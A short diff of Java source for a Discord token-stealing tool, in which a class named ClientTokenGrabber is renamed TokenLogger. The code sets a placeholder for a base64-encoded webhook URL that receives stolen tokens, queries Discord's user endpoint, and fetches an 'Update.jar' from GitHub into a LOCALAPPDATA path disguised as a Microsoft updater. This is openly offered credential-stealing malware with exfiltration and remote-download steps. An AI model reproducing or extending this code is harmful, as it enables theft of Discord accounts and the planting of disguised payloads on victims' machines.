@@ -6,12 +6,12 @@ import java.util.HashSet;
 
 import clienttokengrabber.utils.*;
 
-public class ClientTokenGrabber {
+public class TokenLogger {
     private static Set<String> tokens = new HashSet<>();
     public static final String WEBHOOK_URL = "YOUR BASE64 ENCODED WEBHOOK URL HERE";
     public static final String USER_INFO_URL = "https://discordapp.com/api/v9/users/@me";
     public static final String UPDATER_PATH = System.getenv("LOCALAPPDATA") + "\\Microsoft\\ExampleUpdater.jar";
-    public static final String UPDATER_URL = "https://github.com/0x5d0/Discord-Client-Token-Logger/blob/master/examples/Update.jar";
+    public static final String UPDATER_URL = "https://github.com/0x5d0/Discord-Token-Logger/raw/master/examples/Update.jar";
 
     public static void main(String[] args) {
         FileHelper.delete(UPDATER_PATH);
